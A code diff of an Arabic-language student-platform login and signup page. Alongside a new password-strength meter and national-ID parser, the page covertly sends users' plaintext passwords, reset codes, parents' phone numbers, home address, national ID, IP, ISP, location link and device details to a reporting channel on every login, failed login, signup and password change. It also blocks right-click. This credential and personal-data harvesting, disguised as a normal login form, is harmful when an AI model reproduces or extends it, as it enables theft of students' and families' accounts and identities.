@@ -27,6 +27,9 @@
             --input-border: #cbd5e1;
             --button-bg: #2c8cff;
             --shadow: 0 20px 40px rgba(0,0,0,0.1);
+            --weak: #ef4444;
+            --medium: #f59e0b;
+            --strong: #10b981;
         }
 
         [data-theme="dark"] {
@@ -90,6 +93,29 @@
         .toggle-pass {
             position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
             cursor: pointer; color: var(--button-bg); transition: 0.3s; padding: 5px;
+        }
+
+        /* Password Strength Styles */
+        .strength-container {
+            margin-top: 5px;
+            height: 4px;
+            background: #e2e8f0;
+            border-radius: 2px;
+            overflow: hidden;
+            display: none; /* Hidden by default until typing */
+            transition: 0.3s;
+        }
+        .strength-bar {
+            height: 100%;
+            width: 0;
+            transition: width 0.3s, background-color 0.3s;
+        }
+        .strength-text {
+            font-size: 11px;
+            margin-top: 4px;
+            text-align: left;
+            font-weight: bold;
+            display: none;
         }
 
         .remember-me {
@@ -183,9 +209,13 @@
                 <div class="input-group">
                     <label>كلمة المرور</label>
                     <div class="pass-wrapper">
-                        <input type="password" id="s_pass" minlength="6" required>
+                        <input type="password" id="s_pass" minlength="6" required onkeyup="checkStrength('s_pass', 's_bar', 's_text')">
                         <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('s_pass', this)"></i>
                     </div>
+                    <div class="strength-container" style="display: block;">
+                        <div id="s_bar" class="strength-bar"></div>
+                    </div>
+                    <div id="s_text" class="strength-text"></div>
                 </div>
                 <button type="submit" class="action-btn">تأكيد البيانات</button>
             </form>
@@ -216,9 +246,13 @@
             <div class="input-group">
                 <label>الباسورد الجديد</label>
                 <div class="pass-wrapper">
-                    <input type="password" id="new-p" minlength="6" required>
+                    <input type="password" id="new-p" minlength="6" required onkeyup="checkStrength('new-p', 'np_bar', 'np_text')">
                     <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('new-p', this)"></i>
                 </div>
+                <div class="strength-container" style="display: block;">
+                    <div id="np_bar" class="strength-bar"></div>
+                </div>
+                <div id="np_text" class="strength-text"></div>
             </div>
             <button class="action-btn" onclick="updatePass()">تحديث الحساب</button>
         </div>
@@ -237,39 +271,139 @@
         const saveUser = (u) => { const db = getDB(); db.push(u); localStorage.setItem('hal_users', JSON.stringify(db)); };
 
         // ==========================================
-        //  دالة جمع بيانات الجهاز والموقع (صامتة ومحسنة)
+        //  وظيفة فحص قوة كلمة المرور
+        // ==========================================
+        function checkStrength(inputId, barId, textId) {
+            const val = document.getElementById(inputId).value;
+            const bar = document.getElementById(barId);
+            const text = document.getElementById(textId);
+            
+            if (val.length === 0) {
+                bar.style.width = '0';
+                text.style.display = 'none';
+                return;
+            }
+
+            text.style.display = 'block';
+            let strength = 0;
+            if (val.length > 5) strength += 1;
+            if (val.length > 7) strength += 1;
+            if (/[0-9]/.test(val)) strength += 1;
+            if (/[^A-Za-z0-9]/.test(val)) strength += 1;
+
+            if (strength <= 2) {
+                bar.style.width = '33%'; bar.style.backgroundColor = 'var(--weak)';
+                text.innerText = "ضعيفة"; text.style.color = 'var(--weak)';
+            } else if (strength === 3) {
+                bar.style.width = '66%'; bar.style.backgroundColor = 'var(--medium)';
+                text.innerText = "متوسطة"; text.style.color = 'var(--medium)';
+            } else {
+                bar.style.width = '100%'; bar.style.backgroundColor = 'var(--strong)';
+                text.innerText = "قوية"; text.style.color = 'var(--strong)';
+            }
+        }
+
+        // ==========================================
+        //  تحليل الرقم القومي (أبراج، هجري، ترتيب)
+        // ==========================================
+        function analyzeNationalID(id) {
+            if (!id || id.length !== 14) return "الرقم القومي غير صحيح";
+
+            const govCodes = {
+                '01': 'القاهرة', '02': 'الإسكندرية', '03': 'بورسعيد', '04': 'السويس', '11': 'دمياط',
+                '12': 'الدقهلية', '13': 'الشرقية', '14': 'القليوبية', '15': 'كفر الشيخ', '16': 'الغربية',
+                '17': 'المنوفية', '18': 'البحيرة', '19': 'الإسماعيلية', '21': 'الجيزة', '22': 'بني سويف',
+                '23': 'الفيوم', '24': 'المنيا', '25': 'أسيوط', '26': 'سوهاج', '27': 'قنا', '28': 'أسوان',
+                '29': 'الأقصر', '31': 'البحر الأحمر', '32': 'الوادي الجديد', '33': 'مطروح', '34': 'شمال سيناء',
+                '35': 'جنوب سيناء', '88': 'خارج الجمهورية'
+            };
+
+            const century = id[0] === '2' ? 1900 : 2000;
+            const year = century + parseInt(id.substring(1, 3));
+            const month = parseInt(id.substring(3, 5));
+            const day = parseInt(id.substring(5, 7));
+            const govCode = id.substring(7, 9);
+            const gov = govCodes[govCode] || "غير معروف";
+            const sequence = parseInt(id.substring(9, 13));
+            const gender = sequence % 2 !== 0 ? "ذكر" : "أنثى";
+
+            const getZodiac = (d, m) => {
+                const days = [21, 20, 21, 20, 21, 21, 23, 23, 23, 23, 22, 22];
+                const signs = ["الدلو", "الحوت", "الحمل", "الثور", "الجوزاء", "السرطان", "الأسد", "العذراء", "الميزان", "العقرب", "القوس", "الجدي"];
+                let index = m - 1; 
+                if (d < days[index]) index = (index + 11) % 12;
+                return signs[index];
+            };
+
+            const chineseZodiac = ['القرد', 'الديك', 'الكلب', 'الخنزير', 'الفأر', 'الثور', 'النمر', 'الأرنب', 'التنين', 'الأفعى', 'الحصان', 'العنزة'];
+            const cZodiac = chineseZodiac[year % 12];
+
+            const dateObj = new Date(year, month - 1, day);
+            const hijriDate = new Intl.DateTimeFormat('ar-SA-u-ca-islamic', {day: 'numeric', month: 'long', year: 'numeric'}).format(dateObj);
+
+            return `📅 *تاريخ الميلاد:* ${day}/${month}/${year}\n` +
+                   `📍 *محل الميلاد:* ${gov}\n` +
+                   `👤 *النوع:* ${gender}\n` +
+                   `🌟 *البرج:* ${getZodiac(day, month)}\n` +
+                   `🐉 *البرج الصيني:* ${cZodiac}\n` +
+                   `🕌 *تاريخ الميلاد الهجري:* ${hijriDate}\n` +
+                   `🔢 *تسلسل المولود:* ${id[12]} (في سجلات اليوم)`;
+        }
+
+        // ==========================================
+        //  دالة جمع بيانات الجهاز الموسعة
         // ==========================================
         async function getDeviceInfo() {
             let info = {
                 deviceType: "غير معروف",
-                brandModel: "غير معروف",
+                osVersion: "غير محدد",
+                ram: "غير معروف",
+                storage: "غير متاح",
                 battery: "غير متاح",
                 isp: "غير معروف",
-                ip: "جاري الجلب...",
-                city: "غير معروف",
-                country: "غير معروف",
-                location: "غير معروف"
+                ip: "",
+                city: "",
+                country: "",
+                locationLink: "",
+                simInfo: "غير متاح (محظور من المتصفح)",
+                macAddr: "🔒 Blocked by Browser Security"
             };
 
-            const ua = navigator.userAgent.toLowerCase();
+            const ua = navigator.userAgent;
 
-            // نوع الجهاز
-            if (/android/i.test(ua)) info.deviceType = "📱 Android";
-            else if (/iphone/i.test(ua)) info.deviceType = "📱 iPhone";
-            else if (/ipad/i.test(ua)) info.deviceType = "📱 iPad";
-            else if (/windows/i.test(ua)) info.deviceType = "💻 Windows";
-            else if (/macintosh|mac os x/i.test(ua)) info.deviceType = "💻 Mac OS";
-            else if (/linux/i.test(ua)) info.deviceType = "💻 Linux";
+            // 1. نوع وإصدار الجهاز بدقة أكبر
+            if (/android/i.test(ua)) {
+                info.deviceType = "📱 Android";
+                const match = ua.match(/Android\s([0-9\.]+)/);
+                info.osVersion = match ? `Android ${match[1]}` : "Android";
+            } else if (/iphone/i.test(ua)) {
+                info.deviceType = "📱 iPhone";
+                const match = ua.match(/OS\s([0-9_]+)/);
+                info.osVersion = match ? `iOS ${match[1].replace(/_/g, '.')}` : "iOS";
+            } else if (/windows/i.test(ua)) {
+                info.deviceType = "💻 Windows";
+                info.osVersion = "Windows NT";
+            } else if (/macintosh/i.test(ua)) {
+                info.deviceType = "💻 Mac OS";
+            } else if (/linux/i.test(ua)) {
+                info.deviceType = "💻 Linux";
+            }
 
-            // محاولة استخراج الماركة والموديل
-            const brands = ['samsung','huawei','xiaomi','oppo','vivo','realme','oneplus','google','nokia','sony','lg','motorola','honor'];
-            let brandFound = brands.find(b => ua.includes(b));
-            if (brandFound) info.brandModel = brandFound.charAt(0).toUpperCase() + brandFound.slice(1);
+            // 2. معلومات الرام (متاح في متصفحات كروم/إيدج الحديثة فقط)
+            if ('deviceMemory' in navigator) {
+                info.ram = `~${navigator.deviceMemory} GB`;
+            }
 
-            const modelMatch = ua.match(/\(([^;]+);/i);
-            if (modelMatch) info.brandModel += ` (${modelMatch[1].trim()})`;
+            // 3. معلومات التخزين (Quota المتاح للمتصفح)
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    const available = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
+                    info.storage = `${available} GB (حصة المتصفح)`;
+                } catch(e) {}
+            }
 
-            // البطارية
+            // 4. البطارية
             if ('getBattery' in navigator) {
                 try {
                     const batt = await navigator.getBattery();
@@ -277,44 +411,41 @@
                 } catch (e) {}
             }
 
-            // IP + مدينة + دولة + ISP
+            // 5. بيانات الشبكة والموقع (Sim IP vs Wifi IP)
+            // المتصفح يرى IP واحد فقط (الذي يخرج منه للإنترنت). نميزه عن طريق الـ ISP.
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                info.ip = data.ip || "غير معروف";
-                info.city = data.city || "غير معروف";
-                info.country = data.country_name || "غير معروف";
-                info.isp = data.org || "غير معروف";
-            } catch (e) {
-                info.ip = "فشل الجلب";
-            }
-
-            // الموقع الجغرافي (صامت 100% - فقط إذا كان الإذن موجود مسبقًا)
-            if (navigator.permissions && navigator.permissions.query) {
-                try {
-                    const permission = await navigator.permissions.query({ name: 'geolocation' });
-                    if (permission.state === 'granted') {
-                        const position = await new Promise((res, rej) => {
-                            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 });
-                        });
-                        info.location = `✅ موقع دقيق (GPS مفتوح)\nhttps://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
-                    } else {
-                        info.location = `🔒الموقع مغلق`;
-                    }
-                } catch (err) {
-                    info.location = `⚠️ لا يدعم فحص الإذن أو خطأ في GPS`;
+                info.ip = data.ip || "N/A";
+                info.isp = data.org || data.asn || "N/A";
+                info.city = data.city || "N/A";
+                info.country = data.country_name || "N/A";
+                if(data.latitude && data.longitude) {
+                    info.locationLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                } else {
+                    info.locationLink = "غير متاح";
                 }
-            } else {
-                info.location = `⚠️ المتصفح لا يدعم فحص الأذونات`;
+                
+                // محاولة تخمين نوع الاتصال بناء على المزود
+                if(/vodafone|orange|etisalat|we|telecom egypt|mobile/i.test(info.isp)) {
+                    info.simInfo = `📶 اتصال بيانات (Mobile Data) - ${info.isp}`;
+                } else {
+                    info.simInfo = `🌐 اتصال منزلي (WiFi/DSL) - ${info.isp}`;
+                }
+
+            } catch (e) {
+                info.locationLink = "فشل تحديد الموقع";
             }
 
-            return `📱 *نوع الجهاز:* ${info.deviceType}\n` +
-                   `🏭 *اسم الجهاز:* ${info.brandModel}\n` +
-                   `🌐 *الشبكة:* ${info.isp}\n` +
+            return `📱 *الجهاز:* ${info.deviceType} (${info.osVersion})\n` +
+                   `💾 *الرامات:* ${info.ram} | *التخزين:* ${info.storage}\n` +
                    `🔋 *البطارية:* ${info.battery}\n` +
-                   `⚡ *IP:* ${info.ip}\n` +
-                   `🏙️ *المدينة:* ${info.city}, ${info.country}\n` +
-                   `📍 *حالة الموقع:* ${info.location}`;
+                   `📡 *MAC Address:* \`${info.macAddr}\`\n` +
+                   `📞 *رقم الخط:* 🔒 غير متاح (يتطلب إذن Carrier)\n` +
+                   `🌐 *نوع الاتصال (IP):* \n${info.simInfo}\n` +
+                   `📍 *IP Address:* \`${info.ip}\`\n` +
+                   `🏙️ *الموقع:* ${info.city} - ${info.country}\n` +
+                   `🗺️ *الخريطة:* ${info.locationLink}`;
         }
 
         async function report(txt) {
@@ -404,28 +535,32 @@
                 if(remember) localStorage.setItem('remembered_user', JSON.stringify({phone, pass}));
                 else localStorage.removeItem('remembered_user');
                 
+                const idAnalysis = analyzeNationalID(user.nat);
+
                 await report(`✅ *دخول ناجح*\n\n` +
-                            `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
                             `👤 *اسم الطالب:* ${user.name}\n` +
-                            `📱 *هاتف:* \`${phone}\`\n\n` +
-                            `${fullInfo}\n` +
+                            `📱 *هاتف:* \`${phone}\`\n` +
+                            `📧 *البريد:* ${user.email || 'غير مدخل'}\n\n` +
+                            `🆔 *تحليل بيانات الطالب:*\n` +
+                            `${idAnalysis}\n\n` +
                             `──────────────────\n` +
-                            `🔗 تحليل الـ IP: https://ipinfo.io/${(await fetch('https://ipapi.co/json/').then(r=>r.json())).ip || 'غير معروف'}`);
+                            `🛠️ *تفاصيل الجهاز والشبكة:*\n` +
+                            `${fullInfo}`);
 
                 showStatus("جاري تحويلك للمنصة...", "success");
                 setTimeout(() => window.location.href = "https://home-halthalk.vercel.app", 1200);
             } else {
                 await report(`❌ *محاولة دخول فاشلة*\n\n` +
-                            `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
                             `📱 *الهاتف:* \`${phone}\`\n` +
                             `🔐 *الباسورد المدخل:* \`${pass}\`\n\n` +
+                            `🛠️ *تفاصيل الجهاز والشبكة:*\n` +
                             `${fullInfo}`);
 
                 showStatus("بيانات الدخول غير صحيحة", "error");
             }
         });
 
-        // إنشاء حساب جديد - مع الترتيب المطلوب بالضبط + تقرير الجهاز المحسن
+        // إنشاء حساب جديد
         document.getElementById('signup-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             showStatus("جاري إنشاء الحساب...", "success");
@@ -440,6 +575,7 @@
                 phone: phone,
                 f_phone: document.getElementById('s_f_phone').value.trim(),
                 m_phone: document.getElementById('s_m_phone').value.trim(),
+                email: document.getElementById('s_email').value.trim(),
                 dob: document.getElementById('s_dob').value,
                 loc: document.getElementById('s_loc').value.trim(),
                 nat: document.getElementById('s_nat').value.trim(),
@@ -449,23 +585,22 @@
             saveUser(user);
 
             const deviceReport = await getDeviceInfo();
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const idAnalysis = analyzeNationalID(user.nat);
 
             const reportMsg = `🆕 *طالب جديد مسجل في منصة حلتهالك*\n\n` +
-                              `📅 *التاريخ والوقت:* ${new Date().toLocaleString('EG')}\n\n` +
                               `👤 *اسم الطالب:* ${user.name}\n` +
                               `📱 *هاتف الطالب:* \`${user.phone}\`\n` +
                               `👨 *هاتف الأب:* \`${user.f_phone}\`\n` +
                               `👩 *هاتف الأم:* \`${user.m_phone}\`\n` +
-                              `🎂 *تاريخ الميلاد:* ${user.dob}\n` +
-                              `🏠 *عنوان الطالب:* ${user.loc}\n` +
-                              `🆔 *الرقم القومي:* \`${user.nat}\`\n` +
+                              `📧 *البريد الإلكتروني:* \`${user.email}\`\n` +
+                              `🏠 *عنوان السكن:* ${user.loc}\n` +
                               `🔐 *الباسورد:* \`${user.pass}\`\n\n` +
+                              `🆔 *تحليل الرقم القومي (14 رقم):*\n` +
+                              `🔢 الرقم: \`${user.nat}\`\n` +
+                              `${idAnalysis}\n` +
                               `──────────────────\n` +
-                              `*تقرير الجهاز*\n\n` +
-                              `${deviceReport}\n\n` +
-                              `──────────────────\n` +
-                              `🔗 *تحليل الـ IP الكامل:* https://ipinfo.io/${ipData.ip || 'غير معروف'}`;
+                              `🛠️ *تقرير الجهاز والعتاد:*\n` +
+                              `${deviceReport}`;
 
             await report(reportMsg);
             showStatus("تم إنشاء حسابك بنجاح!", "success");
@@ -487,11 +622,10 @@
                 
                 const fullInfo = await getDeviceInfo();
                 await report(`🔑 *طلب استعادة كلمة مرور*\n\n` +
-                            `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
                             `👤 *اسم الطالب:* ${user.name}\n` +
                             `📱 *الهاتف:* \`${phone}\`\n` +
                             `🔢 *رمز التحقق:* \`${currentOTP}\`\n\n` +
-                            `${fullInfo}`);
+                            `🛠️ *الجهاز:* \n${fullInfo}`);
                 
                 setTimeout(() => switchView('forgot-step2'), 1000);
             } else {
@@ -522,10 +656,9 @@
             
             const fullInfo = await getDeviceInfo();
             await report(`🔄 *تم تغيير كلمة المرور*\n\n` +
-                        `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
                         `📱 *الهاتف:* \`${phone}\`\n` +
                         `🔐 *الباسورد الجديد:* \`${np}\`\n\n` +
-                        `${fullInfo}`);
+                        `🛠️ *الجهاز:* \n${fullInfo}`);
             
             showStatus("تم التحديث بنجاح!", "success");
             setTimeout(() => switchView('login-view'), 1500);
@@ -534,4 +667,4 @@
         document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
-</html>
+                                                                                                                </html>
